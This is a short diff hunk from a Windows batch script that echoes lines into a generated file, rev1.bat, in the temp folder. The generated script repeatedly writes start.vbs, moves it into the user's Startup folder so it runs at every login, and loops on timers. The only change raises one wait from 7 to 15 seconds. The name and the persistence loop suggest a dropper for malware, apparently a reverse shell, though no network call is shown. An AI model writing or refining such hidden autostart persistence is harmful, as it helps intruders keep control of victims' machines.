@@ -17,7 +17,7 @@ cd %temp%
     echo         echo Loop ^>^> "%temp%\start.vbs" >> "%temp%\rev1.bat"
     echo         move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >> "%temp%\rev1.bat"
     echo     ^) >> "%temp%\rev1.bat"
-    echo     timeout /t 7 /nobreak ^>nul >> "%temp%\rev1.bat"
+    echo     timeout /t 15 /nobreak ^>nul >> "%temp%\rev1.bat"
     echo     goto check_start_vbs >> "%temp%\rev1.bat"
     echo timeout /t 300 /nobreak ^>nul >> "%temp%\rev1.bat"
     echo goto loop >> "%temp%\rev1.bat"
